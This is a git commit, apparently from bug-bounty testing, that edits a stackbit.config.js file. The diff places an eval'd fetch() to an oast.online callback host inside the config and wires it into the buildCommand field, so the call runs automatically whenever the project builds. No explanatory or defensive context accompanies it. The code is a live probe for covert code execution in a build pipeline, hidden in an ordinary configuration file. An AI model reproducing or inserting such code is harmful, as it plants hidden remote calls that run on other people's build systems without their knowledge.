7060be53485bcd57c0dd66ed1f151f77b5a50b67
10ad3d <loaded@wearehackerone.com>
2024-06-20 11:06:07 -0700

    change eval

--- stackbit.config.js
+++ stackbit.config.js
@@ -1,1 +1,6 @@
-const e = eval(`fetch(\`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online\`)`);
+const e = () => eval(`fetch(\`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online\`)`);
+
+export default {
+  stackbitConfigVersion: "1",
+  buildCommand: e()
+}
